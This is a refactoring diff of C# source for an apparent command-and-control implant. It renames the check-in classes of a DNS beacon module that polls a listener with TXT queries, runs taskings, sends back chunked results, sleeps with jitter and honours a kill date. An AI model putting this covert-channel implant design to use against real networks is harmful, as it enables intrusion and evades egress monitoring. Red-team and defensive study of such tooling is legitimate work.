@@ -6,9 +6,9 @@ using Rod.V1;
 
 namespace Rod.Implant.Internal;
 
-// The DNS check-in module (architecture.md Sec 8, the contract documented
+// The DNS contact module (architecture.md Sec 8, the contract documented
 // for implant authors in extending/implants.md): the egress-restricted
-// carrier, one TXT query per check-in under the listener's zone. No
+// carrier, one TXT query per contact under the listener's zone. No
 // handshake and no mTLS ride DNS -- the implant is identified by its id
 // alone, the session another transport opened is refreshed, and every
 // tasking answer is verified like a stream-delivered one before anything
@@ -30,9 +30,9 @@ namespace Rod.Implant.Internal;
 // whole before chunking, so their bytes cross as ciphertext too. A build
 // with no key keeps the plaintext grammar end to end.
 
-internal static class DnsCheckIn
+internal static class DnsContact
 {
-    public static ICheckInClient Create(CheckInSetup setup) => new DnsBeacon(
+    public static IContactClient Create(ContactSetup setup) => new DnsBeacon(
         setup.Egress,
         setup.Enrollment.ImplantId,
         setup.Enrollment.CAs,
@@ -48,13 +48,13 @@ internal static class DnsCheckIn
 }
 
 /// <summary>
-/// Runs the implant's check-in lifecycle over the DNS carrier: poll on the
+/// Runs the implant's contact lifecycle over the DNS carrier: poll on the
 /// cadence, run the one short tasking a poll may carry, report its result
 /// as chunked TXT queries. A datagram that never lands is a walk
 /// advancement like any dead front; an empty answer is a quiet poll
 /// (presence refreshed, nothing to run).
 /// </summary>
-internal sealed class DnsBeacon : ICheckInClient
+internal sealed class DnsBeacon : IContactClient
 {
     // The result-chunk budget: each chunk rides one base32 label, and a
     // DNS label caps at 63 bytes -- 30 plaintext bytes expand to 48
@@ -78,7 +78,7 @@ internal sealed class DnsBeacon : ICheckInClient
     private readonly TaskNonceTracker _nonces;
     private readonly HeldTaskLedger _held;
 
-    // The baked envelope key's halves, when the build sealed check-ins: the
+    // The baked envelope key's halves, when the build sealed contacts: the
     // k-poll names the id, the answers and reports seal under the key.
     private readonly (byte[] KeyId, byte[] Key)? _seal;
 
@@ -116,7 +116,7 @@ internal sealed class DnsBeacon : ICheckInClient
         _cadence = cadence;
         _nonces = nonces ?? new TaskNonceTracker();
         _held = held ?? new HeldTaskLedger();
-        _seal = transport is { SealsCheckIns: true }
+        _seal = transport is { SealsContacts: true }
             ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
             : null;
         _poll = new PollChannels(_held, log);
@@ -127,7 +127,7 @@ internal sealed class DnsBeacon : ICheckInClient
 
     public bool Serves(string beaconUrl) => BeaconUrl.IsDns(beaconUrl);
 
-    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
+    public async Task<ContactExit> RunAsync(CancellationToken cancellationToken)
     {
         try
         {
@@ -140,7 +140,7 @@ internal sealed class DnsBeacon : ICheckInClient
         }
     }
 
-    private async Task<CheckInExit> RunCyclesAsync(CancellationToken cancellationToken)
+    private async Task<ContactExit> RunCyclesAsync(CancellationToken cancellationToken)
     {
         // Results whose delivery died with an earlier carrier ride this one
         // first (the dispatch strand): the server reassembles chunks and
@@ -153,10 +153,10 @@ internal sealed class DnsBeacon : ICheckInClient
             if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
             {
                 _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
             if (!Serves(_egress.CurrentBeaconUrl))
-                return CheckInExit.SwitchTransport;
+                return ContactExit.SwitchTransport;
 
             var reached = false;
             try
@@ -169,7 +169,7 @@ internal sealed class DnsBeacon : ICheckInClient
             }
             catch (Exception ex)
             {
-                _log.WriteLine($"dns check-in failed: {ex.Message}");
+                _log.WriteLine($"dns contact failed: {ex.Message}");
             }
 
             if (reached)
@@ -188,14 +188,14 @@ internal sealed class DnsBeacon : ICheckInClient
             try
             {
                 var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
-                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
+                await ContactCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
         }
-        return CheckInExit.Terminate;
+        return ContactExit.Terminate;
     }
 
     // One poll cycle. True when the exchange landed (the resolver answered,
@@ -728,7 +728,7 @@ internal static class DnsDial
 }
 
 /// <summary>
-/// The check-in name grammar (extending/implants.md): lowercase RFC 4648
+/// The contact name grammar (extending/implants.md): lowercase RFC 4648
 /// base32 labels, no padding. The implant-side twin of the listener's
 /// parser -- the wire-shape test keeps the pair in lockstep.
 /// </summary>
